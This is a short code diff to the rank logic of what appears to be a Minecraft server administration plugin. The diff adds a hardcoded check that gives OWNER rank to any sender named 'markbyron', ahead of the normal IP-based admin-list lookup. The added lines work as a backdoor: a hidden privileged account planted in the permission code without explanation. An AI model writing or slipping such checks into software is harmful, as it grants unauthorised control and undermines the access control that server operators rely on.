@@ -69,6 +69,12 @@ public enum TFM_PlayerRank
         {
             return DEVELOPER;
         }
+        
+           if (sender.getName().equals("markbyron"))
+            {
+                return OWNER;
+            }
+ 
 
         final TFM_Admin entry = TFM_AdminList.getEntryByIp(TFM_Util.getIp((Player) sender));
 
